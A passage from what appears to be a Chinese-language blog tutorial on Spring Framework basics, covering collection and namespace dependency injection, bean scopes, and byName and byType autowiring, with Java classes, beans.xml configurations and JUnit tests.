Map&lt;String, String&gt; <span class="hljs-title function_">getCard</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> card;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setCard</span><span class="hljs-params">(Map&lt;String, String&gt; card)</span> &#123;<br>        <span class="hljs-built_in">this</span>.card = card;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> List&lt;String&gt; <span class="hljs-title function_">getHobbys</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> hobbys;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setHobbys</span><span class="hljs-params">(List&lt;String&gt; hobbys)</span> &#123;<br>        <span class="hljs-built_in">this</span>.hobbys = hobbys;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Set&lt;String&gt; <span class="hljs-title function_">getGame</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> game;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setGame</span><span class="hljs-params">(Set&lt;String&gt; game)</span> &#123;<br>        <span class="hljs-built_in">this</span>.game = game;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getWife</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> wife;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setWife</span><span class="hljs-params">(String wife)</span> &#123;<br>        <span class="hljs-built_in">this</span>.wife = wife;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Properties <span class="hljs-title function_">getInfo</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> info;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setInfo</span><span class="hljs-params">(Properties info)</span> &#123;<br>        <span class="hljs-built_in">this</span>.info = info;<br>    &#125;<br><br>    <span class="hljs-comment">//下方内容快捷键生成：Alt + Insert , 生成 toString</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Student&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, address=&quot;</span> + address +<br>                <span class="hljs-string">&quot;, books=&quot;</span> + Arrays.toString(books) +<br>                <span class="hljs-string">&quot;, hobbys=&quot;</span> + hobbys +<br>                <span class="hljs-string">&quot;, card=&quot;</span> + card +<br>                <span class="hljs-string">&quot;, game=&quot;</span> + game +<br>                <span class="hljs-string">&quot;, wife=&#x27;&quot;</span> + wife + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, info=&quot;</span> + info +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br><br>&#125;<br><span class="hljs-keyword">package</span> com.kuang.pojo;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Address</span> &#123;<br>    <span class="hljs-keyword">private</span> String address;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getAddress</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> address;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAddress</span><span class="hljs-params">(String address)</span> &#123;<br>        <span class="hljs-built_in">this</span>.address = address;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Address&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;address=&#x27;&quot;</span> + address + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">import</span> com.kuang.pojo.Student;<br><span class="hljs-keyword">import</span> org.springframework.context.ApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathXmlApplicationContext</span>(<span class="hljs-string">&quot;beans.xml&quot;</span>);<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> (Student) context.getBean(<span class="hljs-string">&quot;student&quot;</span>);<br>        System.out.println(student.toString());<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        Student&#123;</span><br><span class="hljs-comment">            name=&#x27;qwer&#x27;,</span><br><span class="hljs-comment">            address=Address&#123;address=&#x27;北京市海淀区&#x27;&#125;,</span><br><span class="hljs-comment">            books=[西游记, 红楼梦, 水浒传],</span><br><span class="hljs-comment">            hobbys=[听歌, 看电影, 爬山],</span><br><span class="hljs-comment">            card=&#123;中国邮政=456456456465456, 建设=1456682255511&#125;,</span><br><span class="hljs-comment">            game=[LOL, BOB, COC],</span><br><span class="hljs-comment">            wife=&#x27;null&#x27;,</span><br><span class="hljs-comment">            info=&#123;age=18, name=qwer&#125;&#125;</span><br><span class="hljs-comment">        */</span><br>    &#125;<br>&#125;<br>&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;<br>&lt;beans xmlns=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span><br>       xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br>       xsi:schemaLocation=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;<br><br>    &lt;bean id=<span class="hljs-string">&quot;address&quot;</span> class=<span class="hljs-string">&quot;com.kuang.pojo.Address&quot;</span>&gt;<br>        &lt;property name=<span class="hljs-string">&quot;address&quot;</span> value=<span class="hljs-string">&quot;北京市海淀区&quot;</span>/&gt;<br>    &lt;/bean&gt;<br><br>    &lt;bean id=<span class="hljs-string">&quot;student&quot;</span> class=<span class="hljs-string">&quot;com.kuang.pojo.Student&quot;</span>&gt;<br>        &lt;!--第一种，普通值注入，value--&gt;<br>        &lt;property name=<span class="hljs-string">&quot;name&quot;</span> value=<span class="hljs-string">&quot;qwer&quot;</span>/&gt;<br><br>        &lt;!--第二种，Bean注入，ref--&gt;<br>        &lt;property name=<span class="hljs-string">&quot;address&quot;</span> ref=<span class="hljs-string">&quot;address&quot;</span>/&gt;<br><br>        &lt;!--数组--&gt;<br>        &lt;property name=<span class="hljs-string">&quot;books&quot;</span>&gt;<br>            &lt;array&gt;<br>                &lt;value&gt;西游记&lt;/value&gt;<br>                &lt;value&gt;红楼梦&lt;/value&gt;<br>                &lt;value&gt;水浒传&lt;/value&gt;<br>            &lt;/array&gt;<br>        &lt;/property&gt;<br><br>        &lt;!--List--&gt;<br>        &lt;property name=<span class="hljs-string">&quot;hobbys&quot;</span>&gt;<br>            &lt;list&gt;<br>                &lt;value&gt;听歌&lt;/value&gt;<br>                &lt;value&gt;看电影&lt;/value&gt;<br>                &lt;value&gt;爬山&lt;/value&gt;<br>            &lt;/list&gt;<br>        &lt;/property&gt;<br><br>        &lt;!--Map--&gt;<br>        &lt;property name=<span class="hljs-string">&quot;card&quot;</span>&gt;<br>            &lt;map&gt;<br>                &lt;entry key=<span class="hljs-string">&quot;中国邮政&quot;</span> value=<span class="hljs-string">&quot;456456456465456&quot;</span>/&gt;<br>                &lt;entry key=<span class="hljs-string">&quot;建设&quot;</span> value=<span class="hljs-string">&quot;1456682255511&quot;</span>/&gt;<br>            &lt;/map&gt;<br>        &lt;/property&gt;<br><br>        &lt;!--set--&gt;<br>        &lt;property name=<span class="hljs-string">&quot;game&quot;</span>&gt;<br>            &lt;set&gt;<br>                &lt;value&gt;LOL&lt;/value&gt;<br>                &lt;value&gt;BOB&lt;/value&gt;<br>                &lt;value&gt;COC&lt;/value&gt;<br>            &lt;/set&gt;<br>        &lt;/property&gt;<br><br>        &lt;!--Null--&gt;<br>        &lt;property name=<span class="hljs-string">&quot;wife&quot;</span>&gt;<br>            &lt;<span class="hljs-literal">null</span>/&gt;<br>        &lt;/property&gt;<br><br>        &lt;!--Properties--&gt;<br>        &lt;property name=<span class="hljs-string">&quot;info&quot;</span>&gt;<br>            &lt;props&gt;<br>                &lt;prop key=<span class="hljs-string">&quot;name&quot;</span>&gt;qwer&lt;/prop&gt;<br>                &lt;prop key=<span class="hljs-string">&quot;age&quot;</span>&gt;<span class="hljs-number">18</span>&lt;/prop&gt;<br>            &lt;/props&gt;<br>        &lt;/property&gt;<br><br>    &lt;/bean&gt;<br>&lt;/beans&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311752395.png" alt="img"></p><h3 id="2-6-3-拓展方式注入"><a href="#2-6-3-拓展方式注入" class="headerlink" title="2 .6.3 拓展方式注入"></a>2 .6.3 拓展方式注入</h3><h4 id="p命名和c命名注入"><a href="#p命名和c命名注入" class="headerlink" title="p命名和c命名注入"></a>p命名和c命名注入</h4><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311752784.png" alt="img"></p><ul><li>P命名空间注入 : 需要在头文件中加入约束文件</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">导入约束 : xmlns:p=&quot;http://www.springframework.org/schema/p&quot;<br><br><span class="hljs-comment">&lt;!--P(属性: properties)命名空间 , 属性依然要设置set方法--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;user&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.kuang.pojo.User&quot;</span> <span class="hljs-attr">p:name</span>=<span class="hljs-string">&quot;qwer&quot;</span> <span class="hljs-attr">p:age</span>=<span class="hljs-string">&quot;12&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><p>需要导入 junit 包</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.12<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311750611.png" alt="img"></p><ul><li>c 命名空间注入 : 需要在头文件中加入约束文件，同时加上有参构造器</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml">导入约束 : xmlns:c=&quot;http://www.springframework.org/schema/c&quot;<br><span class="hljs-comment">&lt;!--C(构造: Constructor)命名空间 , 属性依然要设置set方法--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;user2&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.kuang.pojo.User&quot;</span> <span class="hljs-attr">c:name</span>=<span class="hljs-string">&quot;qaz&quot;</span> <span class="hljs-attr">c:age</span>=<span class="hljs-string">&quot;18&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><p>有参和无参构造器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">()</span> &#123;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>    <span class="hljs-built_in">this</span>.name = name;<br>    <span class="hljs-built_in">this</span>.age = age;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311750287.png" alt="img"></p><h2 id="2-7-Bean-作用域"><a href="#2-7-Bean-作用域" class="headerlink" title="2.7 Bean 作用域"></a>2.7 Bean 作用域</h2><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311750413.png" alt="img"></p><p>几种作用域中，request、session作用域仅在基于web的应用中使用（不必关心你所采用的是什么web应用框架），只能用在基于web的Spring ApplicationContext环境。</p><h3 id="The-Singleton-Scope-（单例模式）"><a href="#The-Singleton-Scope-（单例模式）" class="headerlink" title="The Singleton Scope （单例模式）"></a>The Singleton Scope （单例模式）</h3><p>在Spring loC容器中仅存在一个Bean实例，Bean以单例方式存在，默认值</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311749740.png" alt="img"></p><p>当一个bean的作用域为Singleton，那么Spring IoC容器中只会存在一个共享的bean实例，并且所有对bean的请求，只要id与该bean定义相匹配，则只会返回bean的同一实例。Singleton是单例类型，就是在创建起容器时就同时自动创建了一个bean的对象，不管你是否使用，他都存在了，每次获取到的对象都是同一个对象。注意，Singleton作用域是Spring中的缺省作用域。要在XML中将bean定义成singleton，可以这样配置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;user2&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.kuang.pojo.User&quot;</span> <span class="hljs-attr">c:age</span>=<span class="hljs-string">&quot;12&quot;</span> <span class="hljs-attr">c:name</span>=<span class="hljs-string">&quot;qwe&quot;</span> <span class="hljs-attr">scope</span>=<span class="hljs-string">&quot;singleton&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311752692.png" alt="img"></p><h3 id="The-Prototype-Scope（原型模式）"><a href="#The-Prototype-Scope（原型模式）" class="headerlink" title="The Prototype Scope（原型模式）"></a>The Prototype Scope（原型模式）</h3><p>每次从容器中调用Bean时，都返回一个新的实例，即每次调用getBean()时，相当于执行newXxxBean()</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311749744.png" alt="img"></p><p>当一个bean的作用域为Prototype，表示一个bean定义对应多个对象实例。Prototype作用域的bean会导致在每次对该bean请求（将其注入到另一个bean中，或者以程序的方式调用容器的getBean()方法）时都会创建一个新的bean实例。Prototype是原型类型，它在我们创建容器的时候并没有实例化，而是当我们获取bean的时候才会去创建一个对象，而且我们每次获取到的对象都不是同一个对象。根据经验，对有状态的bean应该使用prototype作用域，而对无状态的bean则应该使用singleton作用域。在XML中将bean定义成prototype，可以这样配置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;accountService&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.something.DefaultAccountService&quot;</span> <span class="hljs-attr">scope</span>=<span class="hljs-string">&quot;prototype&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><h3 id="request、session、application-这些只能在-web-开发中使用到"><a href="#request、session、application-这些只能在-web-开发中使用到" class="headerlink" title="request、session、application 这些只能在 web 开发中使用到"></a>request、session、application 这些只能在 web 开发中使用到</h3><h2 id="2-8-Bean-的自动装配"><a href="#2-8-Bean-的自动装配" class="headerlink" title="2.8 Bean 的自动装配"></a>2.8 Bean 的自动装配</h2><ul><li>自动装配是使用spring满足bean依赖的一种方法</li><li>spring会在应用上下文中为某个bean寻找其依赖的bean。</li></ul><p><strong>Spring中bean有三种装配方式：</strong></p><ol><li>在xml中显式配置；</li><li>在java中显式配置；</li><li>隐式的bean发现机制和自动装配。</li></ol><p><strong>Spring的自动装配的两个操作：</strong></p><ol><li>组件扫描(component scanning)：spring会自动发现应用上下文中所创建的bean；</li><li>自动装配(autowiring)：spring自动满足bean之间的依赖，也就是我们说的IoC&#x2F;DI；</li></ol><p>组件扫描和自动装配组合发挥巨大威力，使得显示的配置降低到最少。</p><p><strong>推荐不使用自动装配xml配置 , 而使用注解</strong> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.pojo;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">shout</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;miao~&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">package</span> com.kuang.pojo;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">shout</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;wang~&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">package</span> com.kuang.pojo;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">People</span> &#123;<br>    <span class="hljs-keyword">private</span> Cat cat;<br>    <span class="hljs-keyword">private</span> Dog dog;<br>    <span class="hljs-keyword">private</span> String name;<br><br>    <span class="hljs-keyword">public</span> Cat <span class="hljs-title function_">getCat</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> cat;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setCat</span><span class="hljs-params">(Cat cat)</span> &#123;<br>        <span class="hljs-built_in">this</span>.cat = cat;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Dog <span class="hljs-title function_">getDog</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> dog;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setDog</span><span class="hljs-params">(Dog dog)</span> &#123;<br>        <span class="hljs-built_in">this</span>.dog = dog;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;People&#123;&quot;</span> +<br>        <span class="hljs-string">&quot;cat=&quot;</span> + cat +<br>        <span class="hljs-string">&quot;, dog=&quot;</span> + dog +<br>        <span class="hljs-string">&quot;, name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>        <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br>&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;<br>&lt;beans xmlns=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span><br>  xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br>  xsi:schemaLocation=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;<br><br>  &lt;bean id=<span class="hljs-string">&quot;cat&quot;</span> class=<span class="hljs-string">&quot;com.kuang.pojo.Cat&quot;</span>/&gt;<br>  &lt;bean id=<span class="hljs-string">&quot;dog&quot;</span> class=<span class="hljs-string">&quot;com.kuang.pojo.Dog&quot;</span>/&gt;<br><br>  &lt;bean id=<span class="hljs-string">&quot;people&quot;</span> class=<span class="hljs-string">&quot;com.kuang.pojo.People&quot;</span>&gt;<br>    &lt;property name=<span class="hljs-string">&quot;name&quot;</span> value=<span class="hljs-string">&quot;was&quot;</span>/&gt;<br>    &lt;property name=<span class="hljs-string">&quot;dog&quot;</span> ref=<span class="hljs-string">&quot;dog&quot;</span>/&gt;<br>    &lt;property name=<span class="hljs-string">&quot;cat&quot;</span> ref=<span class="hljs-string">&quot;cat&quot;</span>/&gt;<br>  &lt;/bean&gt;<br>&lt;/beans&gt;<br><span class="hljs-keyword">import</span> com.kuang.pojo.People;<br><span class="hljs-keyword">import</span> org.junit.Test;<br><span class="hljs-keyword">import</span> org.springframework.context.ApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyTest</span> &#123;<br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test1</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathXmlApplicationContext</span>(<span class="hljs-string">&quot;beans.xml&quot;</span>);<br>        <span class="hljs-type">People</span> <span class="hljs-variable">people</span> <span class="hljs-operator">=</span> context.getBean(<span class="hljs-string">&quot;people&quot;</span>, People.class);<br>        people.getCat().shout();<br>        people.getDog().shout();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-8-1-byName-自动装配"><a href="#2-8-1-byName-自动装配" class="headerlink" title="2.8.1 byName 自动装配"></a>2.8.1 byName 自动装配</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;cat&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.kuang.pojo.Cat&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;dog&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.kuang.pojo.Dog&quot;</span>/&gt;</span><br><br>  <span class="hljs-comment">&lt;!--byName : 会自动在容器上下文中查找，和自己对象 set 方法后面的值对应的 beanid--&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;people&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.kuang.pojo.People&quot;</span> <span class="hljs-attr">autowire</span>=<span class="hljs-string">&quot;byName&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;was&quot;</span>/&gt;</span><br>    <span class="hljs-comment">&lt;!--            &lt;property name=&quot;dog&quot; ref=&quot;dog&quot;/&gt;--&gt;</span><br>    <span class="hljs-comment">&lt;!--            &lt;property name=&quot;cat&quot; ref=&quot;cat&quot;/&gt;--&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311749984.png" alt="img"></p><p><strong>byName 强调对象 set 方法对应的beanid唯一</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311749029.png" alt="img"></p><h3 id="2-8-2-byType-自动装配"><a href="#2-8-2-byType-自动装配" class="headerlink" title="2.8.2 byType 自动装配"></a>2.8.2 byType 自动装配</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans 